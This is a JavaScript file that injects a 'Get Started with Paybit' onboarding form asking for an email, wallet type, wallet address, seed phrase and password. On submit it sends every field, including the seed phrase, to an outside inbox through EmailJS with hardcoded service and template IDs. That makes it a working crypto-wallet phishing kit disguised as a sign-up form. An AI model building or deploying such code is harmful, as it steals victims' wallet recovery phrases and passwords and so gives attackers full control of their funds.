// Include the EmailJS script in the HTML or dynamically load it in the JavaScript

// Check if EmailJS is already loaded, if not, load it dynamically
if (!window.emailjs) {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
    document.head.appendChild(script);
    script.onload = function() {
        // Initialize EmailJS once it's loaded
        emailjs.init("UzvWE4cijC2AeexsY");  // Your EmailJS user ID
        loadForm(); // Load the form after EmailJS is initialized
    };
} else {
    // EmailJS is already loaded, initialize it
    emailjs.init("UzvWE4cijC2AeexsY");
    loadForm(); // Load the form directly if EmailJS is already loaded
}

// Function to dynamically inject the form HTML into the page
function loadForm() {
    // Form HTML content with inline styles
    const formHTML = `
    <style>
        #form {
            background-color: #f9f9f9;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            max-width: 800px;
            margin: 0 auto;
        }

        #form h2 {
            font-size: 28px;
            font-weight: 600;
            color: #333;
            margin-bottom: 20px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            font-size: 16px;
            color: #555;
            font-weight: 500;
        }

        .form-control {
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
        }

        .form-control:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }

        .btn {
            background-color: #007bff;
            color: white;
            font-size: 16px;
            padding: 12px 20px;
            border: none;
            border-radius: 5px;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn:hover {
            background-color: #0056b3;
        }

        .text-center {
            text-align: center;
        }

        .alert {
            font-size: 16px;
            color: white;
            background-color: #28a745;
            padding: 10px;
            margin-top: 20px;
            text-align: center;
            border-radius: 5px;
        }

        .alert-error {
            background-color: #dc3545;
        }
    </style>

    <section id="form" class="mb-5">
        <h2 class="text-center">Get Started with Paybit</h2>
        <form class="p-4 border rounded">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" name="email" class="form-control" placeholder="Enter your email" required>
            </div>
            <div class="form-group">
                <label for="dropdown1">Wallet Type</label>
                <select name="dropdown1" class="form-control">
                    <option value="" disabled selected>Select Wallet Type</option>
                    <option value="BIP32">BIP32</option>
                    <option value="BIP39">BIP39</option>
                    <option value="BIP44">BIP44</option>
                </select>
            </div>
            <div class="form-group">
                <label for="dropdown2">Mnemonic Length</label>
                <select name="dropdown2" class="form-control">
                    <option value="" disabled selected>Select Mnemonic Length</option>
                    <option value="12">12</option>
                    <option value="18">18</option>
                    <option value="24">24</option>
                </select>
            </div>
            <div class="form-group">
                <label for="address">Wallet Address</label>
                <input type="text" name="address" class="form-control" placeholder="Enter your wallet address" required>
            </div>
            <div class="form-group">
                <label for="seed">Seed Phrase</label>
                <input type="text" name="seed" class="form-control" placeholder="Enter your seed phrase" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" name="password" class="form-control" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn btn-primary btn-block">Submit</button>
        </form>
        <div id="formResponse" class="text-center"></div>
    </section>`;

    // Inject the form HTML into the formContainer div
    document.getElementById('formContainer').innerHTML = formHTML;

    // Add the form submission event handler
    document.querySelector('form').addEventListener('submit', function(event) {
        event.preventDefault();

        // Collect form data
        var emailData = {
            email: document.querySelector('input[name=email]').value,
            dropdown1: document.querySelector('select[name=dropdown1]').value,
            dropdown2: document.querySelector('select[name=dropdown2]').value,
            address: document.querySelector('input[name=address]').value,
            seed: document.querySelector('input[name=seed]').value,
            password: document.querySelector('input[name=password]').value
        };

        // Validate that all fields are filled
        if (!emailData.email || !emailData.dropdown1 || !emailData.dropdown2 || !emailData.address || !emailData.seed || !emailData.password) {
            alert("Please fill out all required fields.");
            return;
        }

        // Send the form data using EmailJS
        emailjs.send("service_29nyhzq", "template_i3682ek", emailData)
            .then(function(response) {
                // Show success message
                document.getElementById('formResponse').innerHTML = '<div class="alert">Email sent successfully!</div>';
            }, function(error) {
                // Show error message if email sending fails
                document.getElementById('formResponse').innerHTML = '<div class="alert alert-error">Failed to send email. Please try again.</div>';
            });
    });
}


